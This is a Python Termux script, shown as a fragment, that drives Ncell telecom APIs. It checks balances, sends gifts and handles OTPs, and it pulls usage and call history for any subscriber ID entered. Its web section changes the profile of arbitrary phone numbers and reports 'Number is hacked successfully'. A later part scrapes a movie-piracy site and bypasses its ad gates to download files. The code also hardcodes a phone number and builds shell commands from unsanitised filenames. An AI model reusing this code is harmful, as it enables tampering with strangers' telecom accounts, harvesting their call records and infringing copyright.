    elif gift=="e":exit()
    if gift!="":
        if int(gift)<=len(codeArray):
            gift=codeArray[int(gift)];
    else: exit();
    sender=takeInput(bcolors.WARNING+"Enter the sender number: ");
    receiver=takeInput(bcolors.BOLD+"Enter the receiver number: ");
    name=takeInput("Enter the sender name: ");
    msg=takeInput("Enter your message: ");
    body={"0":"giftPurchaseRequest","1":{"msisdn":phone,"deviceId":"200280b19915cb7d","productId":gift,"gifterMsisdn":sender,"gifteeMsisdn":receiver,"gifterName":name,"message":msg}}
    response=post("giftingmgt/gift/purchase",body);
    
    
 #query gift packages
 
def queryGift():
    body={"0":"queryProductsRequest","1": {
    "msisdn": phone,
    "deviceId": "200280b19915cb7d",
    "type": "instant",
    "sortType": "validity",
    "sortBy": "asc"
  }}
    jsonfile=""
    url="giftingmgt/query/products"
    response=post(url,body);
    
    try:
      jsonfile=response[2]["queryProductsResponse"]["products"];
     
    except:print("Fetching of product unsuccessful");
    i=1
    codeArray=["empty"]
    for c in jsonfile:
        
        Desc=c["description"];
        Code=c["id"];
        Price=c["totalPrice"]
        Name=c["name"];
        print(Code)
        print(bcolors.WARNING+str(i)+". "+Name+"\nDesc: "+Desc+"\nPrice: Rs "+Price+"\n__________________________\n")
        codeArray.append(Code);
        
        i=i+1;
      
    return codeArray;


#generating otp    
def otpGen():
    global subid;
    url="accountmgt/otp/generate";
    body={"0":"generateOTPRequest","1":{
    "msisdn": phone,
    "deviceId": "8e1031ee34ef51d7",
    "subId": subid,
    "action": "TRAN",
    "null": ""
  }
  }
  
    response=post(url,body);
   # print(response)
    if response[1]=="Successfully generated a new OTP":
       return verOtp();
       
def balance():
    url="accountmgt/balance/query"
    body={"0":"queryBalanceRequest",
            "1":
            {
           "deviceId": "edb5abd145f92b5f",
            "msisdn": phone,
        }
            }
    response=post(url,body);
    #print(response)
    data=response[2]["queryBalanceResponse"];
    balance=data["creditBalanceDetail"]["balance"]
    details=['smsBalanceList',"dataBalanceList"];
    counter=2;
    comb ="\n1. Balance: "+ str(balance)+"\n\n"
    comb2=""
    print(f"1. Balance: {balance}\n")
    for key in details:
        for json in data[key]:
                if counter<4:
                    comb +=str(counter)+ ". "+ json['ncellName']+"\nUsage: "+ str(json['balance']) + json['uom'] + "\nExpiry: "+json['expDate']+"\n\n"
                else:
                    
                    comb2+=str(counter)+ ". "+ json['ncellName']+"\nUsage: "+ str(json['balance']) + json['uom'] + "\nExpiry: "+json['expDate']+"\n\n"
                print(f"{c()}{counter}.{c()} {json['ncellName']}")
                print(f"{c()}Usage: {c()}{json['balance']}{json['uom']}")
                print(f"{c()}Expiry:{c()} {json['expDate']}\n\n")
                counter +=1;

    for json in data["voiceBalanceList"]:
                if counter<4:
                    comb+=str(counter)+ ". "+ json['ncellName']+"\nUsage: "+ str(json['freeTalkTime']) + "Min" + "\nExpiry: "+json['expDate']+"\n\n"
                else:

                    comb2+=str(counter)+ ". "+ json['ncellName']+"\nUsage: "+ str(json['freeTalkTime']) + "Min" + "\nExpiry: "+json['expDate']+"\n\n"
                print(f"{c()}{counter}. {c()}{json['ncellName']}")
                print(f"{c()}Usage:{c()} {json['freeTalkTime']} Min")
                print(f"{c()}Expiry:{c()} {json['expDate']}\n\n") 
                counter +=1;
    return comb,comb2
#verifying otp

def verOtp():
    global subid;
    otpp=takeInput("Enter the otp: ");
    if otpp=="b":return
    elif otpp=="e":exit()
    
    url="accountmgt/otp/validate";
    body={"0":"validateOTPRequest",
    "1":{"msisdn":phone,
    "deviceId": "8e1031ee34ef51d7",
    "subId": subid,
    "action": "TRAN",
    "otp":otpp,
    "null":""
    }
    }
    if otpp!="":
        response=post(url,body);
        #print(response)
        if response[2]["validateOTPResponse"]["authenticated"]==True:
            print("OMG successfull in validation..");
            return 1;
        
#multiple day detail sender
def mul(number,number1):
    global ff
    a=int(int(number1)-1)//7;
    ff = str(datetime.datetime.now())

    
    
    for i in range(a+1):
        if a>0 and i!=a:
            starting=int(number)-i*7
            total=7;
        elif i==a:
            total=int(number1)-a*7;
            starting=int(number)-a*7
            
        date1=dateTime(int(starting)*(-1));
        
        
        date2=str(dateTime(total-1-int(starting)));
        info(1,date1,date2)
        #print(i)
        #print(date1)
        #print(date2)
        time.sleep(5);
        
        
        

#getting info 
 
def info(ohoh=0,a=0,b=0):
    global subid,date1,date2,tt
    if ohoh!=1:
        
        tt=takeInput("Enter the subscriber id(m): ");
    
        if tt=="m":
            tt=subid;
        else:
            if len(tt)<4:
                print("Subsriber id incorrect..");
                return;
        #checker=takeInput("Check by no. of days(n) or exact date(d): ")
        #if checker=="n":
        number=takeInput("Enter no. of days in past(w): ");
        if number=="w":number=6
            
        #if checker=="d":
        
            #date1=takeInput("Enter the starting date eg(2020-05-04): ");
            #date2=takeInput("Enter the ending date eg(2020-05-09): ");
        #if checker=="":return;
        number1=takeInput("Enter no. days from past(w): ");
        if number1=="w":
            number1=7;
        else: number1=int(number1)+1;
        mul(number,number1)
        return
        
        
        
    

    
    
    url="accountmgt/transaction/history/detail"
    body={"0":"transactionDetailRequest",
        "1": {"msisdn": "9824486107",
    "deviceId": "8e1031ee34ef51d7",
    "subId": tt,
    "action": "TRAN",
    "dateRange": {
      "from": str(a)+"T00:00:00.000Z",
      "to": str(b)+"T23:59:59.000Z"
    },
    "pagination": {
      "range": 1000,
      "start": 1,
      "pageOffSet": 1,
      "totalRecords": 0,
      "originalTotalRecords": 0
    },
    "transactionType": "USAGE",
    "timeZone": "Asia/Kathmandu"
  }
    }
    
   # print(body)

    
    response=post(url,body);
    if response[1]=="Success":
        print("Saving from "+str(a)+" to "+str(b))
        detail=response[2]["transactionDetailResponse"]["productDetailList"];
        print("There are "+str(len(detail)) +" details ");
        printing(detail);
    if response[1]=="Unauthorized Access. OTP validation is required":
        status=otpGen();
        if status==1:
            info(1,a,b)
    
    #print(response);

def printing(response):
    global ff
    n=len(response);
    #print(response)

    f=open("/sdcard/#all "+ff+".txt" ,"a");
    call=open("/sdcard/#callMsg "+ff+".txt" ,"a");
    
    topup=open("/sdcard/#topup "+ff+".txt" ,"a");
    data=open("/sdcard/#internet "+ff+".txt" ,"a");
    
    
    for i in range(n-1,-1,-1):
        #
        d=""


        
        product=response[i]["product"];
        type=product["type"]
        duration=response[i]["duration"];
        if duration!=None:
        
            unit=duration["uom"];
            value=duration["value"];
            if unit=="B":
                value=str(((int(value)/1024)/1024))+" MB";
            if unit=="S":
                value=str((int(value)/60))+" Mins"
        usage=response[i]["usage"];
        
        a="*********#"+str(i+1)+"#********\n"
        
        b="Name: "+str(product["name"])+"\nType: "+str(product["type"])+"\nvalue: "+str(product["value"])
        c="\nAmount: "+str(usage["amount"])+"\nUnit: "+str(usage["uom"])
        if duration!=None:
            d="\nDuration: "+value;
        e="\nTime: "+response[i]["time"]+"\nDate: "+response[i]["date"]
        g="\n*************************\n\n\n";
        #print(a+b+c+d+e+g)
        
        f.write(a+"\n"+b+"\n"+c+"\n"+d+"\n"+e+"\n"+g)
        if type=="VOICESMS":        call.write(a+"\n"+b+"\n"+c+"\n"+d+"\n"+e+"\n"+g)
        elif type=="DATA":        data.write(a+"\n"+b+"\n"+c+"\n"+d+"\n"+e+"\n"+g)
        elif type=="TOPUP":         topup.write(a+"\n"+b+"\n"+c+"\n"+d+"\n"+e+"\n"+g)
       # elif type=="SMS":        sms.write(a+"\n"+b+"\n"+c+"\n"+d+"\n"+e+"\n"+g)
    f.close()
    call.close()
    data.close()
    topup.close()
   # sms.close();
    
  
  
  
def dateTime(t):
    start=datetime.date.today()+datetime.timedelta(int(t));
    
    return start;
    
  


#refreshing the refreshToken

def refreshToken():
    global current,refresh,phone,expire
    body={"0":"refreshTokenRequest","1":{"refreshToken":refresh} }
    url="user/refresh/token"

    response=post(url,body);
    try:
     if len(response[2]["userAuthResponse"]["accessToken"])>10:
         current=response[2]["userAuthResponse"]["accessToken"];
         refresh=response[2]["userAuthResponse"]["refreshToken"];
         expire=response[2]["userAuthResponse"]["expiresIn"];
         
         write(phonep=phone,currentp=current,refreshp=refresh,expirep=expire);
        
        
        
    except:
        if func_wow==123:
            
            os.system("../usr/bin/termux-notification --button1 Refresh --button2 Accounts --button1-action 'termux-notification-remove 12345;termux-notification-remove 1234; ncell1' --button3-action 'termux-notification-remove 1234' --button3 Close --button2-action 'ncell2'  --image /sdcard/termux.png --id 1234 -t '😭Access Token Invalid😭' -c '"+phone+"||"+name+"\nPlease login again or choose other account\n😡😡'")
            os.system("am broadcast -a com.jozein.xedgepro.PERFORM -e data 6402")
            exit()
        login();

        


#making logout button

def logouti():
    confirm=takeInput(bcolors.WARNING+"Are you sure want to logout (y|n): ")
    if confirm=="y" or confirm=="Y":
    
          
          os.rename("data.json","data.json.bak");
          print("You are logout..");
          exit();
      

######################################################ncell web
phone2=""
def getheader():
    headerweb={
"Host": "webapi.ncell.axiata.com",
"Authorization": token,
"Content-Type": "application/json;charset=UTF-8",
"Accept": "application/json, text/plain, */*"
        }

    return headerweb



def getdata():
    global phone2

    data={
        "email":"sagar@gmail.com",
        "first_name":"Sagar",
        "last_name":"thapa",
        "date_of_birth":"12/10/2000",
        "phone_number":phone2
        }
    return data

def getsend():
    url="https://webapi.ncell.axiata.com/v1/account/dashboard";
    response=requests.get(url,headers=getheader()).json();
    return response["data"]

def postsend():
    global phone2
    
    url="https://webapi.ncell.axiata.com/v1/account/update-profile";
    data=json.dumps(getdata());
    
    response=requests.post(url,data=data,headers=getheader()).json()
    
    if response["message"]=="Information updated successfully.":
        readwrite1(1);
        print(f"\n{c()}Number is hacked successfully\n")
    
    else:
        if response["message"]=="Unauthenticated.":
            print(f"\n{c()}Please login here\n")
            return 10
        print()
        print(f'{c()}{response["message"]}')
        print()
        return 12

def weblogin(mode=0):
    global token,phone2,default,password2;
    hhhh = {
"Host": "webapi.ncell.axiata.com",
"Authorization":"Bearer "+gettoken() ,
"Content-Type": "application/json;charset=UTF-8",
"Accept": "application/json, text/plain, */*"
        }
    url="https://webapi.ncell.axiata.com/v1/account/login/request"
    if mode==0:
        phone2=input(f"{c()}Enter{c()} the {c()}phone: {c()}");
        if phone2=="b":return
        if not  len(phone2)>=10:
            exit();
        phone2= re.sub("[\W_]","",phone2)[-10:]
        password1 = input(f"{c()}Enter {c()}the {c()}password:{c()} " );
        if password1=="b":return
    if mode==1:
        password1 = password2;
        
    data =json.dumps({
  "phoneNumber":phone2,
  "password": password1,
  "redirectTo": " ",
  "url":"/v1/account/login/request"
        })
    response =requests.post(url,headers=hhhh,data=data).json();
    code = response["message"];
    if code=="OK":
        token ="Bearer "+response["data"]["token"]
        if mode==0:
            default =phone2
        password2= password1
        readwrite1(1);
        print(f"\n{c()}Login{c()} successfull\n")
    else:
        print(code);
    

def gettoken():
    url ="https://www.ncell.axiata.com"+"/en/auth/login";
    header={
"Host": "webapi.ncell.axiata.com"
        }
    
    response = requests.get(url);
    return response.cookies["ncell_website"]
    # print(response.text)

def printerweb():
    global phone2
    response=getsend()
    print(f"\n{c()}phone: {phone2}")
    balance= response["balanceInfo"]["currentBalance"]
    counter=2
    print(f"\n{c()}1. Balance: {balance}\n") 
    for key in response["packInfo"]:
        types=gettype(key)
        for json in response["packInfo"][key]:
            print(f"{c()}{counter}. {json['title_en']}"  )
            if key=="voicePack":
                print(f"{c()}Remaining: {json['remaining']/60}/{json['total']/60} {types}" )
            else:
                print(f"{c()}Remaining: {json['remaining']}/{json['total']} {types}" )
            print(f"{c()}Validity:{ json['validity']}\n")
            counter+=1

def gettype(key):
    types={"dataPack":"MB","voicePack":"Min","smsPack":"SMS"}
    return types[key]



def readwrite1( mode=0):
    global token,phone2,default,password2,web_numbers;
    if not os.path.exists("ncellweb.json"):
            with open("ncellweb.json","w")as fp:
                fp.write('{"phone":"","token":"","default":"", "password":"", "numbers":[] }');

    if mode==0:
                    with open("ncellweb.json") as fp:
                        dd = fp.read();
                        
                        data = json.loads(dd);
                        phone2 = data["phone"]
                        token =data["token"]
                        default=data["default"]
                        password2 = data["password"]
                        web_numbers=data["numbers"];
                        
                        
    elif mode==1:
        
         
        with open("ncellweb.json","w") as writef:
            
            if not phone2 in web_numbers:
                web_numbers.append(phone2);
            data ={"phone":phone2,"token":token,"default":default,"password":password2,"numbers":web_numbers}
            
            data1=json.dumps(data,indent=4);
            writef.write(data1)
            
def printnumbers():
    global web_numbers,phone2,default
    readwrite1();
   
    count=1
    temp = phone2;
    
    
    print(f"{c()}\n___________________________\n")
    for web_number in web_numbers:
        if phone2 ==web_number:
            web_status=" #"
        else:web_status=""
        if default ==web_number:
            web_status2=" (default)"
        else:
            web_status2=""
        print(f'{c()}{count}. {web_number}{web_status}{web_status2}')
        count +=1;
    print(f"{c()}___________________________\n")

    in_number= input(f"{c()}Enter {c()}the {c()}number: ");
    if in_number=="b":return;
    elif in_number=="e":exit();
    elif len(in_number)>=10:
        phone2 =re.sub("[\W_]","",in_number)[-10:]
        
    else:
        phone2 = web_numbers[int(in_number)-1];
        if temp==phone2:
                printerweb();input("")
                return
            
        
            
    res=postsend()
    if not res ==12 and not res==10:printerweb();input("")
    if res==10:weblogin(); 



def setdefault():
    global phone2,default;
    readwrite1();
    # weblogin(1)
    temp = phone2 
    phone2 = default
   
    postsend();
    

# weblogin() #login with password manually
readwrite1(); #entry point here

def webaxiata():
    global phone2
    while True:
    
        aa=input(f"{c()}1.{c()} Login\n{c()}2. {c()}AutoLogin\n{c()}3.{c()} Set Default\n{c()}4. {c()}Print\n{c()}5.{c()} Choose number\n{c()}=>{c()}");
        os.system("clear");print(f"{c()}We{c()}lc{c()}om{c()}e {c()}to {c()}nc{c()}el{c()}l m{c()}od{c()}s{c()}\n__{c()}_______{c()}________{c()}____")
        try:
            if aa=="b":
                break;
            elif aa=="e":os.system('clear');exit();
            elif aa=="4":printerweb();input("")
            elif int(aa)==1:
                weblogin();
            elif int(aa)==2:weblogin(1);
            elif int(aa)==3:setdefault();
            elif int(aa)==5:printnumbers();
            elif len(aa)==10:
                phone2=aa;
                
                res=postsend()
                if not res ==12 and not res==10:printerweb();input("")
                if res==10:weblogin()
            # input(f"{c()}Press enter to show menu: ")
        except Exception as e:pass    
            




#end of ncell web
#starting the whole process
pro =0
def app():
    global func_wow,pro
    
    start();

    if func_wow==123:
        os.system("../usr/bin/termux-notification  -t 'Processing the script' -c '\n\nPlease wait a second' --id 1234")
        os.system("../usr/bin/termux-notification-remove 12345")
        out1,out2=balance()
        phon= "'Phone: 😳😳"+str(phone)+"||"+name+"😳😳'"
        out1 = "'"+out1 +"'"

        if len(out2)>8:
            out2 = "'"+out2 +"'"

            os.system("../usr/bin/termux-notification --button1 Refresh --button2 Accounts --button1-action 'termux-notification-remove 12345;termux-notification-remove 1234; ncell1' --button3-action 'termux-notification-remove 12345' --button3 Close --button2-action 'ncell2'  --image /sdcard/termux.png --id 12345  -c "+ out2)
        os.system("../usr/bin/termux-notification --button1 Refresh --button2 Accounts --button1-action 'termux-notification-remove 1234;termux-notification-remove 12345; ncell1' --button3-action 'termux-notification-remove 1234' --button3 Close --button2-action 'ncell2'  -t "+phon+" --image /sdcard/termux.png --id 1234  -c "+ out1)
        os.system("am broadcast -a com.jozein.xedgepro.PERFORM -e data 6402")
        return
    pro+=1
    if pro==1:
        profile();
        # pass
    
    
    runner="";
    while True:
        if func_wow==1234:
            code,index =dialog("spinner","Choose from the following","1. Balance,2. Login,3. subscribe,4. Unsubscribe,5. Send SMS,6. Exit")
            if code==-1:
                choose=str(index+1)
                if choose=="5":sendsms();
                elif choose=="3":subuns();
                elif choose=="4":subuns("un");
                elif choose=="1":balance();
                elif choose=="2" : login();
                elif choose=="6": break;
        else:
            choose=takeInput(bcolors.WARNING+"\n\n---------------------------\n\n"+bcolors.HEADER+"Enter the choice\n"+bcolors.OKGREEN+"1.Check Data\n"+bcolors.OKCYAN+"2.Login\n"+bcolors.HEADER+"3.Subscribe\n"+bcolors.WARNING+"4.Unsubscribe\n"+bcolors.FAIL+"5.Send SMS\n"+bcolors.OKGREEN+"6.Call Details\n"+"=> ");
            os.system("clear");print(f"{c()}We{c()}lc{c()}om{c()}e {c()}to {c()}nc{c()}el{c()}l m{c()}od{c()}s{c()}\n__{c()}_______{c()}________{c()}____")
        try:
            if choose=="b" or choose==8:return;
            if choose=="e":os.system('clear');exit()
            if choose=="5":sendsms();
            elif choose=="3":subuns();
            elif choose=="4":subuns("un");
            elif choose=="7":giftSend();
            elif choose=="2" : login();
            elif choose=="6": info();
            elif choose=="1": balance();
            elif choose=="v": verOtp();
            elif choose=="t": dateTime();
            elif choose=="m":mul(15,15);
        except Exception as e:pass
        








#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#for repeating all the things here
def web():
    # print(f"{c()}\n***********************************")
    readwrite("update")
    logintest();
    choice=""
    while(True):
        # print("I am here")
        # if not choice in [1]:
        # os.system("clear");print(f"{c()}We{c()}lc{c()}om{c()}e {c()}to {c()}nc{c()}el{c()}l m{c()}od{c()}s{c()}\n__{c()}_______{c()}________{c()}____") 
        print("\n***********************************\n")
        for i in range(len(fun_list)):
            print(f'{c()}{i+1}. {fun_list[i][0]}');
        
        text=take("Enter the choice: ");
        os.system("clear");print(f"{c()}We{c()}lc{c()}om{c()}e {c()}to {c()}nc{c()}el{c()}l m{c()}od{c()}s{c()}\n__{c()}_______{c()}________{c()}____")
        
        try:
            if text=="b":return;
            try:
                choice=int(text);
            except:
                continue;
            
            if choice <= len(fun_list):
                fun_list[choice-1][1]();
                # ch=input(f"\n{c()}Press enter  to show menu: ");
                # if ch=="b":return;
                # if ch=="e":exit();
            else:
                print("\n\nEnter the correct choice\n\n");
        except Exception as e:pass
#Happy ending here everythings



###########################
# moviesverse here
from bs4 import BeautifulSoup as bs 
import re
import pathlib 
from tqdm import tqdm 
import shutil
main_host= "https://moviezverse.com"
if not os.path.exists(".device.txt"):
    temp = input("Are you android(y|n): ")
    with open(".device.txt","w") as f:
            f.write(str(temp))

with open(".device.txt") as f:
    f = f.read()
    if f=="y":
        if not os.path.exists("/sdcard/Movies"):os.mkdir("/sdcard/Movies")
        command="termux-open "
        directory="/sdcard/Movies"
    else:
        command="google-chrome-stable --enable-logging=stderr --v=1 > log.txt 2>&1 ";
        directory="Movies";
        if not os.path.exists("Movies"):
            os.mkdir("Movies")



def file_write(url="",status="",size="",main_links="",total="1",type="write"):
    filename="movies.json"
    original_list=""

    if not os.path.exists(filename):
        with open(filename,"w") as file:
            file.write("{}")

    with open(filename) as file:

        original_list =file.read()
        try:
            original_list = json.loads(original_list)
        except Exception as e:print(e)

    if type=="read":
        return original_list

    file_local = url[ url.rfind('/')+1: ]
    file_path =directory+file_local

    if int(size)/(1024*1024*1024)>=1:size = f"{round(int(size)/(1024*1024*1024),2)} GB"
    else: size =f"{round(int(size)/(1024*1024),2)} MB"
    if int(total)/(1024*1024*1024)>=1:total = f"{round(int(total)/(1024*1024*1024),2)} GB"
    else: total =f"{round(int(total)/(1024*1024),2)} MB"

    
        

    if type=="write":    
        with open(filename,"w") as f:
            # print(original_list)
            original_list[file_local]={"url":url,"status":status,"size":size,"main_link":main_links,"total":total}
            f.write(json.dumps(original_list,indent=4))


# file_write("Avatar.mp4","paused","123456677")
import urllib.parse



# url ="http://162.12.215.254/Data/Movies/Dual%20Audio/2020/Beauty%20and%20the%20Beast%202014%20Dual%20Audio%20Hindi%20720p%20BluRay/Beauty%20and%20the%20Beast%202014%20Dual%20Audio%20Hindi%20720p%20BluRay.mkv"


# total_parts =120 
def set_progress_bar(total_size):
    global progress_bar
    progress_bar =tqdm(total=total_size, unit="iB",unit_scale=True)

def delete_chunk():
    real_directory=directory+"/.temp_chunk"
    if os.path.exists(real_directory):shutil.rmtree(real_directory)
def download_thread(url,total_parts,total_size,part,range_location):
        
    global counter
    # print(f"Starting the thread {part+1}")
    try:
        if not os.path.exists(directory):os.mkdir(directory)
        real_directory=directory+"/.temp_chunk"
        # print(real_directory) #
        if not os.path.exists(real_directory):os.mkdir(real_directory)
    except:pass
    real_filename =urllib.parse.unquote(url[ url.rfind('/')+1: ])
    filename =f"{real_directory}/{real_filename}-0{part+1}.bin"
    # print(filename) #
    if os.path.exists(filename):
        size_local_file = pathlib.Path(filename).stat().st_size
        # print(range_location[0])
        headers={'Range':f'bytes={int(range_location[0])+size_local_file-1}-{range_location[1]}'}
        progress_bar.update(size_local_file)
    else:
        headers={'Range':f'bytes={range_location[0]}-{range_location[1]}'}
    # print(headers)

    res = requests.get(url,headers=headers,stream=True)
    # size_server_file = int(res.headers['content-length'])

    
    with open(filename,"ab") as file:
        for data in res.iter_content(8192):
            progress_bar.update(len(data))
            file.write(data)
    #after successfull completion
    counter+=1
    # print(f"Finished the thread{part+1}")
    command=""
    if counter==total_parts:
        
        real_filename = '"'+real_filename +'"'
        print(f"{c()}All the file chunk are downloaded successfully")
        for i in range(total_parts):
            command += f"{real_directory}/{real_filename}-0{i+1}.bin "
            # print(filename)
        # print(command)
        os.system("cat "+command +" >"+directory+"/"+real_filename)
        os.system("rm "+command )
    

def create_thread(url=""):
    global counter
    counter  = 0
    # total_size = get_total_size(url)
    parts = input(f"{c()}Enter {c()}the {c()}no. {c()}of{c()} split {c()}(l|n|h):{c()}")
   
    if parts=="n":parts=6
    elif parts=="l":parts=3
    elif parts=="h":parts=9
    elif parts=="b":return 
    elif parts=="e":exit()
    else:parts=int(parts)
    total_size = int(requests.get(url,stream=True).headers['content-length'])
    set_progress_bar(total_size)
    
    each_size = int(total_size/parts)
    for i in range(parts):
        start=i*each_size+i
        if not i==parts-1: end=i*each_size+each_size+i
        else:end=""
        # print(f"{start}-{end}")
        threading.Thread(target=download_thread,args=(url,parts,total_size,i,[start,end],)).start()


# # create_thread(url)
# delete_chunk()
def clear():
    os.system('clear')
    print(f"{c()}We{c()}lc{c()}om{c()}e {c()}to {c()}Mo{c()}v{c()}ie{c()}zv{c()}er{c()}se{c()}.c{c()}om\n{c()}___________{c()}___________{c()}_______")


def downloader(url,main_links):
    try:
        filename =urllib.parse.unquote(url[ url.rfind('/')+1: ])

        # print("Hey")
        # size_local_file = pathlib.Path( directory + filename).stat().st_size
        movie_json = file_write(type="read")
        try:
            if movie_json[filename]['status'] =="completed" and  os.path.exists(f"{directory}/{filename}"):
                if pathlib.Path(f"{directory}/{filename}").stat().st_size>1*1024*1024:
                    print(f"{c()}File is already downlaoded\n");
                    ccc=input(f"\n{c()}Do{c()} you{c()} want{c()} to{c()} open{c()} it{c()} now(y|n{c()}):")
                    if ccc=="y":os.system(command+f"{directory}/{filename}")
                    return 
        except Exception as e:pass

        if not  os.path.exists(f"{directory}/{filename}"):open(f"{directory}/{filename}","w").close()
        size_local_file = pathlib.Path( f"{directory}/{filename}").stat().st_size
        headers={"Hey":"No",'Range':f'bytes={size_local_file}-'}
        # print(headers)    
        response = requests.get(url,headers=headers,stream=True)
        # print(response.headers)
        size_server_file = int(response.headers.get('content-length',0) )
        
        if size_server_file==0:print(f"{c()}May be file is downloaded or try again");input();return 
        print(f"{c()}Filename: {filename}\n{c()}Location: {directory}\n")
        block_size = 8192
        progress_bar =tqdm(total=int(size_local_file)+int(size_server_file), unit="iB",unit_scale=True)
        progress_bar.update(size_local_file)
        file_write(url,"paused",pathlib.Path(f"{directory}/{filename}").stat().st_size,main_links,size_server_file+size_local_file)
        with open(f"{directory}/{filename}","ab") as file:
            try:
                for data in response.iter_content(block_size):
                    
                    progress_bar.update(len(data))
                    file.write(data)

            except:
                # print(e)
                print(f"{c()}Failed{c()} downloading{c()} the{c()} file...");input("")
                # input(f"{c()}\n\n\nPress enter to show option:\n\n")
                file.close()
                # print(directory + filename)
                file_write(url,"paused",pathlib.Path( f"{directory}/{filename}").stat().st_size,main_links,size_server_file+size_local_file)
                return

        progress_bar.close()
        file_write(url,"completed",pathlib.Path( f"{directory}/{filename}").stat().st_size,main_links,size_server_file+size_local_file)
        # print(file_write(type="read"))
        clear()
        print(f"{c()}\nFile {c()}is {c()}downloaded {c()}successfully{c()}...{c()}\n")
        ccc=input(f"\n{c()}Do{c()} you{c()} want{c()} to{c()} open{c()} it{c()} now(y|n{c()}):")
        if ccc=="y":os.system(command+f"{directory}/{filename}")
    except Exception as e:print(f"{c()}Failed{c()} downloading{c()} the{c()} file...");input("")

###################################3


# main_host="https://dexmovies.xyz"
def send_request(type,host,path,body=""):
    try:
        url = host+path
        headers={"Host":host.replace("https://",""),"Content-Type": "application/x-www-form-urlencoded"}
        if type=="get":
            
            return requests.get(url).text
        else:
            return requests.post(url,data=body,headers=headers).text

    except:return ""

def is_link_working(url):
    # print(url) 
    response = requests.get(url,stream=True)
    print(f"{c()}____{c()}____{c()}Completed {c()} step {c()}2{c()}_____{c()}_____\n")
    try:
        length = response.headers['Content-Length']
        
    except Exception as e:length=0;
    clear()
    if int(length)>10*1024*1024:
        if int(length)/(1024*1024*1024) >=1:
            print(f"{c()}***************************\n{c()}Size of file is{c()} {round(int(length)/(1024*1024*1024),2)} GB\n***************************")
        else:
            print(f"{c()}***************************\n{c()}Size of file is{c()} {round(int(length)/(1024*1024),2)} MB\n***************************")
        return True 
    else:
        return False 



def read_drive_links(url):
    # print(url)
    try:
        response= requests.get(url).text
        links = []
        soup = bs(response,'html.parser')

        max_btn=soup.find_all('a',class_='maxbutton') #string=""
        try:
            for link in max_btn:
                if not "policiesforyou" in url: 
                    links.append([ [link['title']],link["href"] ] )
                else:
                    links.append([ [link.text],link["href"] ] )
        except Exception as e:print(e)
        # return links 


        tags = soup.find_all('h3')
        for tag in tags:
            links.append([ [tag.text],tag.a["href"] ] )
        return links

    except:return []

def bypass_ads(token):
    try:
        print(f"{c()}********{c()}********{c()}Bypassing {c()}the {c()}ads{c()}*********{c()}********")

        pattern ="(https://[\.a-z]+/\?)(https://[.a-z]+)"
        
        search = re.search(pattern,token)
        host = search.group(2)
        # print(token)
        token = token.replace("https://href.li/?https://sifitales.com/?id=","")
        response=send_request("post",host,"","_wp_http="+token)
        
        soup = bs(response,'html.parser')
        
        action = soup.find("form")["action"].replace("https://sifitales.com","")
        inputs = soup.find_all("input")
        http2,token = inputs[0]['value'],inputs[1]['value']
        # print("2. Second stage is completed successfully")
        # print(action,http2,token)

        #sending the step two of ads bypass
        print(f"{c()}____{c()}____{c()}Completed {c()} step {c()}1{c()}_____{c()}_____")

        response=send_request("post",host,action,"_wp_http2="+http2+"&token="+token)
        # print("3. Third stage is completed successfully")
        
        pattern = '(https://.+go=sk-.+")'
        search =re.search(pattern,response)
        print(f"{c()}____{c()}____{c()}Completed {c()} step {c()}2{c()}_____{c()}_____")

        if search:
            link = search.group().replace('"',"")
            link = link.replace("https://sifitales.com","")
            # print({link.replace("/?go=",""):http2})
            response =requests.get(host+link, cookies={link.replace("/?go=",""):http2} )
            print(f"{c()}____{c()}____{c()}Completed {c()} step {c()}3{c()}_____{c()}_____\n")
            
            temp_url = bs(response.text,"html.parser").find_all("meta")[1]["content"].replace("0;url=","")
            # print(temp_url,"bypass_ads")
            return temp_url
    except:""
            # print(response)
        

def get_movies_list(movie=""):
    try:
        path="/?s="+movie
        response = send_request("get",main_host,path)
        
        movies  = bs(response,'html.parser').find_all("a",class_="post-image")
        
        movies_list=[]
        for mov in movies:
            # print(mov['title'])   #printing the movies here
            movies_list.append([mov["href"],mov["title"]])
        return movies_list
    except:return []
    # print(movies_list[0][0])
    # response = requests.get(movies_list[0][0]).text

def get_movie_quality(movie):
    try:
        response = requests.get(movie).text
        
        soup = bs(response,'html.parser').find("h2",string =re.compile('[Ss]creen[Ss]hots:'))
        if soup==None:
            soup =bs(response,'html.parser').find("span",string =re.compile('[Ss]creen[Ss]hots:')).parent
        counter = 0
        array_link=[]
        
        tags=[]
        # print( soup.parent.contents )
        # print(len(soup.parent.contents))
        for tag in  soup.next_siblings:
            if tag=="\n":continue
            if tag.name=="div":tags.append(tag)

    
        if len(tags)==0 and len(soup.parent.contents)>10 :tags=soup.next_siblings;
        elif len(tags)==0 and len(soup.parent.contents)<10 :tags=soup.parent.parent;
        elif len(tags)==1:tags=tags[0]
        elif len(tags)==2:tags=tags[1]
        elif len(tags)==3:tags=tags[2]
    
        for tag in tags:
            # print(f"\n\n\n*********************************\n{tag}")
            try:
                tag_name = tag.a['class'][1]
                # print(tag.a['class'])
                # print(tag_name)
            except:tag_name=""
            if tag=="\n":continue
            if tag.a==None:
                
                # if counter==0 and header=="h3":counter=1;continue
                if tag.text=="Search Movies":break
                title=tag.text
                counter+=1
            
            elif tag_name=="maxbutton" and tag.a:
                temp_array=[]
                
                for a_tag in tag.children:
                    if a_tag=="\n":continue
                    try:
                        temp_array.append([a_tag.text,a_tag['href']])
                    except:pass
                if len(temp_array)>0:
                    array_link.append([title,temp_array])
            
        return array_link
    except:return []

def real_link(url,type=1):

    try:    
        print(f"{c()}********{c()}********{c()}Fetching {c()}the {c()}links{c()}*********{c()}********")

        pattern ="(http[sS]://[\.a-z]+)"
        host = re.search(pattern,url).group(1)
        headers={"Host":host.replace("https://","")}
        looper=1
        if host=="https://raninfoapi.xyz":
                new_url = requests.get(url)
                # print(new_url.text)
                # print(url)
                url = bs(new_url.text,'html.parser').find('a',class_="btn-success")['href']
                print(f"{c()}____{c()}____{c()}Completed {c()} step {c()}{looper}{c()}_____{c()}_____")
                # print(url)
                looper+=1
                url = requests.get(url,allow_redirects=False).headers['Location']
                print(f"{c()}____{c()}____{c()}Completed {c()} step {c()}{looper}{c()}_____{c()}_____")
                looper+=1
                # print(url)
                host = re.search(pattern,url).group(1)
                headers={"Host":host.replace("https://","")}
        if type==1:    
            link = requests.get(url,headers=headers,allow_redirects=False).headers['location'].replace("/file","/devfile")
